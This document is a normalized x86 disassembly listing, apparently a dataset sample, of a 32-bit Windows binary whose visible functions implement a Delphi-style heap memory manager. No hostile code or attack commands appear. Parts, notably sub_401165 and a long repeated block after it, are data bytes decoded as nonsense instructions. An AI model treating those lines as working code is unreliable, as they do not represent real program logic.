sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0xffffffffd8004010 ]
xor al 0x40
add ah cl
push esi
inc eax
add al bl
push esi
inc eax
add ah ch
xor al 0x40
add al ah
xor al 0x40
add al ch
push esi
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x11004032 ] al
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov [ ecx + 0x47 ] ss
add [ ebx - 0x77da0040 ] cl
push ecx
inc edi
add [ ebx - 0x7bda0040 ] cl
push ecx
inc edi
add [ ebx - 0x7fda0040 ] cl
push ecx
inc edi
add [ ebx + 0x7c25ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x7825ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x7425ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x7025ffc0 ] cl
push ecx
inc edi
add [ ebx - 0x43da0040 ] cl
push ecx
inc edi
add [ ebx + 0x6c25ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x6825ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x6425ffc0 ] cl
push ecx
inc edi
add [ ebx - 0x2bda0040 ] cl
push ecx
inc edi
add [ ebx - 0x2fda0040 ] cl
push ecx
inc edi
add [ ebx - 0x33da0040 ] cl
push ecx
inc edi
add [ ebx + 0x6025ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x5c25ffc0 ] cl
push ecx
inc edi
add [ ebx - 0x1bda0040 ] cl
push ecx
inc edi
add [ ebx - 0x1fda0040 ] cl
push ecx
inc edi
add [ ebx - 0x23da0040 ] cl
push ecx
inc edi
add [ ebx + 0x5825ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x5425ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x5025ffc0 ] cl
push ecx
inc edi
add [ ebx + 0x4c25ffc0 ] cl
push ecx
inc edi
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x59 ] dl
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401348
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call sub_401348
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call sub_401348
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call sub_401348
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call sub_401348
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ac8
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403ac8
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
